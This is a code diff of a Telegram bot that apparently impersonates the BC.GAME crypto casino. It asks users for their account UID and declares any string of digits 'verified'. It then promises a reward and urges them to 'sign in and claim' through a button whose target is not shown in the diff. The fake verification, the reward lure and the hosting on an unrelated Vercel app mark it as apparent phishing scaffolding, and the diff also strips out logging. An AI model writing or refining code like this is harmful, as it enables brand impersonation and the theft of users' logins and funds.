@@ -3,25 +3,22 @@ require('dotenv').config();
 
 const bot = new Telegraf(process.env.BOT_TOKEN);
 
-// Ensure URL ends with slash
 let webUrl = process.env.WEBAPP_URL || 'https://telegrambot-navy.vercel.app/';
 if (!webUrl.endsWith('/')) webUrl += '/';
 
-const profileImg = `${webUrl}profile.png`;
-const engineImg = `${webUrl}engine.png`;
+const startImg = `${webUrl}start_image.jpg`;
+const uidImg = `${webUrl}uid_image.jpg`;
 
 bot.start(async (ctx) => {
     try {
-        console.log('Sending start photo:', profileImg);
-        await ctx.replyWithPhoto(profileImg, {
-            caption: `<b>Welcome to BC.GAME ENGINE</b>\n\nTo continue, please provide your BC.GAME User ID (UID) to verify your account.`,
+        await ctx.replyWithPhoto(startImg, {
+            caption: `<b>Welcome to BC.GAME</b>\n\nTo continue, please provide your BC.GAME User ID (UID) to verify your account.`,
             parse_mode: 'HTML',
             ...Markup.inlineKeyboard([
                 [Markup.button.url('Join Channel', 'https://t.me/bcgame_official')]
             ])
         });
     } catch (e) {
-        console.error('Bot photo error:', e.message);
         ctx.reply('Welcome! Please enter your User ID to continue.');
     }
 });
@@ -31,7 +28,7 @@ bot.on('text', async (ctx) => {
     
     if (/^\d+$/.test(text)) {
         try {
-            await ctx.replyWithPhoto(engineImg, {
+            await ctx.replyWithPhoto(uidImg, {
                 caption: `<b>UID Verified: ${text}</b>\n\nYou are now eligible to claim your reward. Click the button below to sign in and claim.`,
                 parse_mode: 'HTML',
                 ...Markup.inlineKeyboard([
